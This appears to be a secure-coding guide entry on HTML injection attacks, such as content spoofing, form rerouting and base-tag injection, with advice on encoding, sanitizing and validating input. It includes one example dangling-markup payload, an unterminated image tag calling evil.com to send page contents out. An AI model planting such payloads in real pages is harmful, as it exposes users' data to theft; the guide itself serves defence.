# HTML injections
-------

## Description:

Whenever an attacker can inject HTML in your application there is a variety of different
attacks he could perform such as:

1. Content Spoofing
2. Image Tag Injection 	
3. Form Rerouting
4. Base Jumping
5. Element Override
6. Hanging Textarea

Even when your application intercepts XSS injections by means of a content security policy
header it still remains vulnerable to the attacks summarized above.

## Solution:

1.Content spoofing Otherwise known as "Content Injection" or "Virtual Defacement" occurs
whenever an attacker can inject code into your application. It is very important to sanitize and
or encode user data before you display it on screen as HTML.

2.Image tag injection occurs whenever an attacker injects a broken image tag with a non terminated
parameter like : "img src='http://evil.com?steal.php?value=
Every content after value= parameter will now be stolen and send to evil.com by the attacker
till the injection finds the next occurrence of a matching single quote.

Again you should sanitize and encode the user-input to prevent an image tag from being injected
in your application. For whenever a user is permitted to submit an image on your application
enforce and verify the application accepts valid non-broken tags only.

3.The "form" tag can't be nested. The top-level occurrence of this element
always takes precedence over subsequent appearances. Again you must avoid this type by
properly encoding and sanitizing your user-inputs.

4.Whenever an attacker injects a "base" tag into your application it can steal data because
the <base> tag specifies the base URL/target to where to process his data to.

The solution to base jumping would be to us absolute paths in your application such as:
action='/update_profile.php'

instead of:
action='update_profile.php'

5/6 can both also easily be prevented simply be encoding or sanitizing your user-input
submitted towards your application.

Always validate your user-input on a high level(server side constraint). Whenever your
application expects an integer you should validate and check whether the user submitted
input really is what you expected it to be and otherwise you terminate and log the request.
